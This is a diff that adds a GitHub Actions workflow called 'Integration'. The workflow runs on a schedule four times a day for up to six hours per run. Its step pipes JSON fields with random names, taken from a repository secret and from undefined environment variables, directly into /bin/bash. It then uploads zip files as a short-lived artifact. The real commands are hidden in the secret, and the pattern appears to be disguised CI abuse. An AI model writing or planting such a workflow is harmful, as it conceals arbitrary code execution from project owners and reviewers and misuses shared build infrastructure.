@@ -1,0 +1,34 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          y3: ${{ secrets.y3 }}
+        run: |
+          printf '%s' "$y3" | jq -r .fxxz619 | /bin/bash
+          echo $xm65711 | jq -r .zknp8 | /bin/bash
+          printf '%s' "$b6179" | jq -r .osgj57 | /bin/bash
+          printf '%s' "$urse88752" | jq -r .hws1 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1jI9DBHN
+          path: "*.zip"
+          retention-days: 1
